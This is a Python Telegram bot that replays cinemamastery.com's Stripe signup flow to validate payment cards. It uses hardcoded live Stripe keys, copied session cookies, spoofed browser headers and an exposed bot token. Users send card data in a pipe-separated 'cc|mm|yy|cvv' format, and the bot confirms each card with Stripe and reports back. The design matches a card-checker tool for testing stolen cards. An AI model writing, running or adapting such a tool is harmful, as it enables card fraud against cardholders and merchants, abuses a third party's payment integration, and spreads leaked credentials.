import telebot
import requests
import json
import logging
import re

# Set up logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

# Replace with your actual Telegram Bot Token
BOT_TOKEN = "8072279299:AAHAEodRhWpDb2g7EIVNFc3pk1Yg0YlpaPc"
bot = telebot.TeleBot(BOT_TOKEN)

# Cinema Mastery Specific Information (HARDCODED - VALUES PROVIDED BY YOU)
PAGE_ID = "ZCtvdkFwV0ZBb2J1ZEpEOUw2YlRrQT09LS1tOFh1YXFEMWZlVEp5MGhPRnFRb2JnPT0=--06eb28a5479ac90f95675383388a8be1ecb4e0bc"
STRIPE_PUBLISHABLE_KEY = "pk_live_51IksXdLsdufqQtEPrF9bXcJSrESLkgnbnfldl87Y1B20yq8lVkogGvYx5jpEduPg2CDuQ1E15IQzaaIRExFp0xkL001gqjnUZQ"
STRIPE_ACCOUNT_ID = "acct_1IksXdLsdufqQtEP"
CINEMAMASTERY_BASE_URL = "https://cinemamastery.com"
STRIPE_API_URL = "https://api.stripe.com/v1"

# Headers
COMMON_HEADERS = {
    "accept": "application/json",
    "accept-language": "en-US,en;q=0.9",
    "accept-encoding": "gzip, deflate, br",
    "user-agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/130.0.6723.37 Mobile/15E148 Safari/604.1",
    "sec-fetch-site": "same-origin",
    "sec-fetch-mode": "cors",
    "origin": "https://cinemamastery.com",
    "sec-fetch-dest": "empty",
}

STRIPE_HEADERS = {
    "accept": "application/json",
    "accept-language": "en-US,en;q=0.9",
    "accept-encoding": "gzip, deflate, br",
    "user-agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/130.0.6723.37 Mobile/15E148 Safari/604.1",
    "sec-fetch-site": "same-site",
    "sec-fetch-mode": "cors",
    "origin": "https://js.stripe.com",
    "sec-fetch-dest": "empty",
    "content-type": "application/x-www-form-urlencoded",
}

# Cookies
COOKIES = {
    "_fbp": "fb.1.1738294847796.955848381489153141",
    "__stripe_mid": "7da5ad17-018c-42cc-9492-32ed159395c2cc3f1e",
    "__stripe_sid": "3feb4abf-4ade-43c0-a81a-0f683aa90879a57235",
    "__cf_bm": "58KaB6NWV7Z7fKzsekDquFWLVdsTE_utj7g9GImGn24-1745858559-1.0.1.1-64hq2uLs8jZgoDPH41XYWqwmq6keZuE0NVM2tSmgkyu4Yebo2fydXzuKe2hrAKB2p41hjNrpUEFrj15XjYM3b.MMwzQkk1Y6e606WpR53K1MBQHfx.vyDGjp5cqlvocA",
    "_cfuvid": "Kph2PoezT8zqD6KocBVy4QZ9WKnsjcKosLoIlC0Igkk-1745858559250-0.0.1.1-604800000",
    "cf:aff_sub": "",
    "cf:aff_sub2": "",
    "cf:aff_sub3": "",
    "cf:affiliate_id": "",
    "cf:cf_affiliate_id": "",
    "cf:content": "",
    "cf:medium": "",
    "cf:name": "",
    "cf:source": "",
    "cf:term": "",
    "2744757_viewed_4": "25",
    "68fehmxkn876kwg4": "true",
    "addevent_track_cookie": "cad1c7c9-7fe3-4e6e-9f2b-dfd6915060b9",
    "cf:MTY2MDU2NjI:": "visited=true",
    "cf:visitor_id": "d154afba-089f-4fb5-a2c3-da5c5628b29b",
}

def create_setup_intent(page_id, stripe_publishable_key, stripe_account_id):
    url = f"{CINEMAMASTERY_BASE_URL}/api/non_oauth/stripe_intents/setup_intents/create"
    headers = COMMON_HEADERS.copy()
    headers["content-type"] = "application/json"
    headers["referer"] = "https://cinemamastery.com/signup"
    payload = json.dumps({
        "page_id": page_id,
        "stripe_publishable_key": stripe_publishable_key,
        "stripe_account_id": stripe_account_id,
    })
    print(f"Create Setup Intent URL: {url}")
    print(f"Create Setup Intent Headers: {headers}")
    print(f"Create Setup Intent Payload: {payload}")
    try:
        response = requests.post(url, headers=headers, data=payload, cookies=COOKIES)
        response.raise_for_status()
        return response.json().get("client_secret")
    except requests.exceptions.RequestException as e:
        logging.error(f"Error creating setup intent: {e} - Response: {getattr(e.response, 'text', None)}")
        return None

def extract_setup_intent_id(client_secret):
    if client_secret and client_secret.startswith("seti_"):
        return client_secret.split('_secret')[0]
    return None

# --- Part 1 Ends Here ---
# --- Part 2 Begins Here ---

# Global variable to store the setup intent ID
setup_intent_id = None

def confirm_setup_intent(setup_intent_id, name, email, cc, mm, yy, cvv, guid):
    url = f"{STRIPE_API_URL}/setup_intents/{setup_intent_id}/confirm"
    headers = STRIPE_HEADERS.copy()
    payload = f"payment_method_data[type]=card&payment_method_data[billing_details][email]={email}&payment_method_data[billing_details][name]={name}&payment_method_data[card][number]={cc}&payment_method_data[card][cvc]={cvv}&payment_method_data[card][exp_month]={mm}&payment_method_data[card][exp_year]={yy}&payment_method_data[guid]={guid}&payment_method_data[muid]={COOKIES.get('__stripe_mid', '')}&payment_method_data[sid]={COOKIES.get('__stripe_sid', '')}&payment_method_data[pasted_fields]=number&payment_method_data[payment_user_agent]=stripe.js%2Fb85ba7b837%3B+stripe-js-v3%2Fb85ba7b837%3B+split-card-element&payment_method_data[referrer]=https%3A%2F%2Fcinemamastery.com&payment_method_data[time_on_page]=83450&expected_payment_method_type=card&use_stripe_sdk=true&key=pk_live_51IksXdLsdufqQtEPrF9bXcJSrESLkgnbnfldl87Y1B20yq8lVkogGvYx5jpEduPg2CDuQ1E15IQzaaIRExFp0xkL001gqjnUZQ&_stripe_account=acct_1IksXdLsdufqQtEP&client_secret={setup_intent_id}_secret_SDLTC7os9SvuJT19rHGNEVx9RV3OaLi"
    try:
        response = requests.post(url, headers=headers, data=payload, cookies=COOKIES)
        response.raise_for_status()
        return response.json()
    except requests.exceptions.RequestException as e:
        logging.error(f"Error confirming setup intent: {e} - Response: {getattr(e.response, 'text', None)}")
        return None

# Telegram Bot Handlers
@bot.message_handler(commands=['start'])
def send_welcome(message):
    bot.reply_to(message, "Welcome! Please provide your name, email, and credit card details in the format: name|email|cc|mm|yy|cvv|guid")
    # Immediately try to create the setup intent
    global setup_intent_id
    client_secret = create_setup_intent(PAGE_ID, STRIPE_PUBLISHABLE_KEY, STRIPE_ACCOUNT_ID)
    if client_secret:
        setup_intent_id = extract_setup_intent_id(client_secret)
        if not setup_intent_id:
            bot.send_message(message.chat.id, "Error: Could not extract Setup Intent ID.")
    else:
        bot.send_message(message.chat.id, "Error: Failed to create setup intent.")

@bot.message_handler(func=lambda message: len(message.text.split('|')) == 7)
def process_payment_info(message):
    try:
        name, email, cc, mm_str, yy_str, cvv, guid = message.text.split('|')

        if not (mm_str.isdigit() and yy_str.isdigit() and cvv.isdigit() and len(guid) > 0):
            bot.reply_to(message, "Invalid format. Please use numbers for month, year, CVV, and provide a valid GUID.")
            return

        mm = int(mm_str)
        yy = int(yy_str) if len(yy_str) == 4 else int(f"20{yy_str}")

        bot.reply_to(message, "Confirming setup intent...")
        if setup_intent_id:
            confirm_result = confirm_setup_intent(setup_intent_id, name, email, cc, mm, yy, cvv, guid)
            if confirm_result:
                bot.reply_to(message, f"Setup intent confirmation successful!\n{json.dumps(confirm_result, indent=2)}")
            else:
                bot.reply_to(message, "Failed to confirm setup intent.")
        else:
            bot.reply_to(message, "Error: Setup Intent ID is not available. Did the bot fail to initialize?")

    except ValueError:
        bot.reply_to(message, "Invalid input format. Please use: name|email|cc|mm|yy|cvv|guid")
    except Exception as e:
        logging.error(f"Error processing payment info: {e}")
        bot.reply_to(message, f"An error occurred: {e}")

@bot.message_handler(func=lambda message: True)
def echo_all(message):
    bot.reply_to(message, "Please send /start to begin the payment setup.")

if __name__ == '__main__':
    logging.info("Bot started...")
    bot.polling(none_stop=True)